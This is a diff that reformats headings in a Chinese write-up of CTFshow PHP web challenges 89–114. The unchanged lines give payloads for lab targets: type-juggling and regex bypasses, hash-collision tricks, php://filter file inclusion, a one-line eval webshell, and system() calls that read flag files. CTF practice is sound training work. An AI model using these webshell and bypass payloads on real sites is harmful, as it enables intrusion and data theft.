@@ -2,7 +2,7 @@
 [特性总结](https://www.anquanke.com/post/id/231507/)
 **[CTFshow89-150](https://ctf.show/challenges)**
 **[学长笔记](https://exp10it.io/posts/ctfshow-web-php-89-110-writeup/)**
-**·89**
+## ·89
 ![PHP4x0.png](https://img.xobear.cn/file/CTF/WEB/PHP/1781271597564_PHP4x0.png)
 
 **[preg_match()](https://www.php.net/manual/zh/function.preg-match.php)**
@@ -11,7 +11,7 @@
 获取变量的整数值，空的 array（**数组**） 返回 0，非空的 array 返回 1 (**True**)
 `pyload=URL/?num[]=a`
 
-# **·90**
+## ·90
 ![PHP4x1.png](https://img.xobear.cn/file/CTF/WEB/PHP/1781271594095_PHP4x1.png)
 
 **==** 会判断内容是否相同, 不会判断类型是否相同
@@ -26,7 +26,7 @@
 
 pyload=URL`/?num=0x117c`   `/?num=1146.0`   `/?num=1146aaa`
 
-**·91**
+## ·91
 **[preg_match($pattern, $subject, $matches)](https://www.php.net/manual/zh/function.preg-match.php)**
 String $pattern 正则表达式模式 (pattern='/ /')
 
@@ -42,13 +42,13 @@ String $matches 如果提供了matches,它将被填充为搜索到的匹配项
 只有整个字符串完全等于 php 才会匹配成功
 pyload=URL/?cmd=%0axaxa%0aphp
 
-**·92**
+## ·92
 ![PHP4x4.png](https://img.xobear.cn/file/CTF/WEB/PHP/1781271597054_PHP4x4.png)
 弱比较类型
 
 4476.0用不了了，但是4476.1可以
 
-**·93**
+## ·93
 
 ![PHP4x5.png](https://img.xobear.cn/file/CTF/WEB/PHP/1781271594320_PHP4x5.png)
 十六进制和科学计数法不能用了, 但八进制和小数点还能用
@@ -57,7 +57,7 @@ pyload=URL/?cmd=%0axaxa%0aphp
 
 
 
-**·94**
+## ·94
 ![PHP4x6.png](https://img.xobear.cn/file/CTF/WEB/PHP/1781271599304_PHP4x6.png)
 **[strpos($subject, $needle, $offset = 0)](https://www.php.net/manual/zh/function.strpos.php)** -----> 查找字符串首次出现的位置，**如果没找到 字符串，将返回 false**。
 如果我们使用八进制 010574, `strpos("010574", "0") `返回0, 也就是 false, 加了 ! 后反而变成 true
@@ -73,7 +73,7 @@ strpos 返回 1，取反 !1 为 false，所以不会执行 die()。
 加号(%2B)也可以绕过（加号提交过去解码就是空格）
 `pyload=URL/?num=+010574`
 
-**·95**
+## ·95
 ![PHP4x7.png](https://img.xobear.cn/file/CTF/WEB/PHP/1781271598012_PHP4x7.png)
 这里的preg_match()过滤**字母**过滤**小数点**
 !strpos()过滤八进制的0
@@ -82,7 +82,7 @@ strpos 返回 1，取反 !1 为 false，所以不会执行 die()。
 `pyload=URL/?num=%20010574`
 
 
-**·96**
+## ·96
 ![PHP4x8.png](https://img.xobear.cn/file/CTF/WEB/PHP/1781271603584_PHP4x8.png)
 文件包含漏洞
 **[highlight_file()](https://www.php.net/manual/zh/function.highlight-file.php)**
@@ -92,7 +92,7 @@ highlight_file() 函数用于高亮显示文件内容。
 给绝对路径：`?u=/var/www/html/flag.php`
 相对路径`?u=./flag.php`
 
-**·97**
+## ·97
 ![PHP4x9.png](https://img.xobear.cn/file/CTF/WEB/PHP/1781271601677_PHP4x9.png)
 POST传入ab值，ab不等，ab的md5值相等返回flag
 注意这里是`===`
@@ -103,7 +103,7 @@ POST传入ab值，ab不等，ab的md5值相等返回flag
 NULL===NULL 返回 true
 注意： **数组不能为空**
 
-**·98**
+## ·98
 ![PHP4x10.png](https://img.xobear.cn/file/CTF/WEB/PHP/1781271595407_PHP4x10.png)
 
 | 三元运算符                                                   | 意思                                                                                               |
@@ -119,7 +119,7 @@ NULL===NULL 返回 true
 ![PHP4x11.png](https://img.xobear.cn/file/CTF/WEB/PHP/1781271601236_PHP4x11.png)
 **GET 随便一个值都可以, 只要保证 POST 的内容是 HTTP_FLAG=flag 即可**
 
-**·99**
+## ·99
 ![PHP4x12.png](https://img.xobear.cn/file/CTF/WEB/PHP/1781271603053_PHP4x12.png)
 
 创建一个叫 $allow 的数组，从 36 循环到 876(0x36d)，每一轮都往数组里加一个1 到当前 $i 的随机数，最终数组里有 841 个随机整数创建一个叫 $allow 的数组，
@@ -145,7 +145,7 @@ content=<?php eval($_POST[1]);?>
 1=system('tac flag36d.php');
 
 
-**·100**
+## ·100
 ![PHP4x13.png](https://img.xobear.cn/file/CTF/WEB/PHP/1781271596029_PHP4x13.png)
 **`=` 的优先级大于`and`**
 v1是数字
@@ -159,7 +159,7 @@ pyload=`URL/?v1=1&v2=eval($_POST[1])?>&v3=;`
 
 把`0x2d`--->`-`
 
-**·101**
+## ·101
 ![PHP4x14.png](https://img.xobear.cn/file/CTF/WEB/PHP/1781271602485_PHP4x14.png)
 
 **[ReflectionClass 类](https://www.php.net/manual/zh/class.reflectionclass.php)**:报告了一个类的有关信息。
@@ -169,7 +169,7 @@ pyload=`URL/?v1=1&v2=eval($_POST[1])?>&v3=;`
 把0x2d替换为-,最后一位需要爆破16次，题目给的flag少一位
 
 
-**·102**
+## ·102
 ![PHP4x15.png](https://img.xobear.cn/file/CTF/WEB/PHP/1781271598586_PHP4x15.png)
 
 
@@ -203,14 +203,14 @@ hex 码前面记得补两个0 (substr)
 
 `v1=hex2bin`
 
-**·103**
+## ·103
 ![PHP4x16.png](https://img.xobear.cn/file/CTF/WEB/PHP/1781271603190_PHP4x16.png)
 相较于102，这里多了过滤。
 这个正则 `/.*p.*h.*p.*/i` :只要字符串里按顺序出现了 ``p → 任意字符 → h → 任意字符 → p``，不管中间隔了多少东西，不管大小写，就会匹配成功返回True
 
 上题pyload依然可用
 
-**·104**
+## ·104
 ![PHP4x17.png](https://img.xobear.cn/file/CTF/WEB/PHP/1781271603092_PHP4x17.png)
 sha1() 函数用于计算字符串的 SHA-1 哈希值。
 **[sha1()](https://www.php.net/manual/zh/function.sha1.php)**:返回字符串的 SHA-1 哈希值。()**   
@@ -218,7 +218,7 @@ sha1() 函数用于计算字符串的 SHA-1 哈希值。
 ![PHP4x17_1.png](https://img.xobear.cn/file/CTF/WEB/PHP/1781271600449_PHP4x17_1.png)
 * 注意 sha1 0e 漏洞, 而且是 ==  
 * 或者用数组绕过
-**·105**
+## ·105
 ![PHP4x18.png](https://img.xobear.cn/file/CTF/WEB/PHP/1781271601298_PHP4x18.png)
 **[foreach()](https://www.php.net/manual/zh/control-structures.foreach.php)**:遍历数组或对象的每个元素。
 
@@ -236,14 +236,14 @@ GET 传递 ?suces=flag&flag=, 同时 POST flag=
 ![PHP4x18_1.png](https://img.xobear.cn/file/CTF/WEB/PHP/1781271603764_PHP4x18_1.png)
 pyload=`URL/?suces=flag&, 同时 POST error=suces`
 
-**106**
+## 106
 ![PHP4x19.png](https://img.xobear.cn/file/CTF/WEB/PHP/1781271408596_PHP4x19.png)
 POST v1  GET v2
 [sha1()](https://www.php.net/manual/zh/function.sha1.php) — 计算字符串的 sha1 散列值
 构造满足条件的v1v2就行
 数组绕过/用0e
 
-**107**
+## 107
 ![PHP4x20.png](https://img.xobear.cn/file/CTF/WEB/PHP/1781271404456_PHP4x20.png)
 [parse_str()](https://www.php.net/manual/zh/function.parse-str.php) — 解析查询字符串
 解析，并将 key 设置到指定  数组中
@@ -254,7 +254,7 @@ v3=240610708--------->md5为0E
 
 换个姿势 数组
 GET: ?v3[]= POST: v1=
-**108**
+## 108
 
 ![PHP4x21.png](https://img.xobear.cn/file/CTF/WEB/PHP/1781271381706_PHP4x21.png)
 **[ereg()]**:执行正则表达式匹配。c的前后都要为字母。存在NULL截断漏洞 %00 后面的不参与匹配。
@@ -262,7 +262,7 @@ GET: ?v3[]= POST: v1=
 然后再取整，与0x36d比较（0x36d=877，比较时自动转为10进制）
 ?c=aa%00778
 
-**109**
+## 109
 ![image copy.png](https://img.xobear.cn/file/CTF/WEB/PHP/1781272104740_image_copy.png)
 ?v1=Exception&v2=system('cat f*.*') 
 
@@ -279,7 +279,7 @@ FilesystemIterator|文件系统迭代器类 遍历目录里所有文件
 stdClass|标准类 PHP 内置的 “空类”
 DirectoryIterator|目录迭代器类 也是用来遍历目录的类
 
-**110**
+## 110
 ![image.png](https://img.xobear.cn/file/CTF/WEB/PHP/1781272103736_image.png)
 穿过正则
 执行`eval("echo new $v1($v2());");`
@@ -289,7 +289,7 @@ echo new $v1($v2());
 [getcwd()](https://www.php.net/manual/zh/function.getcwd.php) 函数 获取当前工作目录
 echo new FilesystemIterator(getcwd());
 
-**111**
+## 111
 ![image copy 2.png](https://img.xobear.cn/file/CTF/WEB/PHP/1781272106200_image_copy_2.png)
 绕过正则，当v1=ctfshow的时候执行getFlag
 include("flag.php"); 需要用到全局变量 `GLOBALS 常量数组` 才可以看到flag
@@ -299,7 +299,7 @@ var_dump($$v1);   `var_dump($ctfshow);`--->`var_dump($GLOBALS);`
 
 ?v1=ctfshow&v2=GLOBALS
 
-**112**
+## 112
 ![image copy 3.png](https://img.xobear.cn/file/CTF/WEB/PHP/1781272106396_image_copy_3.png)
 [is_file()](https://www.php.net/manual/zh/function.is-file.php) 函数用于检查文件是否存在。
 如果文件存在且为正常的文件则返回 true，否则返回 false。这里if条件有`！`
@@ -310,7 +310,7 @@ php://filter/read=convert.quoted-printable-encode/resource=flag.php
 compress.zlib://flag.php
 
 
-**113**
+## 113
 ![image copy 4.png](https://img.xobear.cn/file/CTF/WEB/PHP/1781272105600_image_copy_4.png)
 
 `compress.zlib://flag.php` 压缩流
@@ -321,7 +321,7 @@ c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/
 self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se
 lf/root/proc/self/root/var/www/html/flag.php` 目录溢出
 
-**114**
+## 114
 ![image copy 5.png](https://img.xobear.cn/file/CTF/WEB/PHP/1781272102769_image_copy_5.png)
 这题的php没有被过滤。相应的zip流被过滤了
 `?file=php://filter/resource=flag.php`
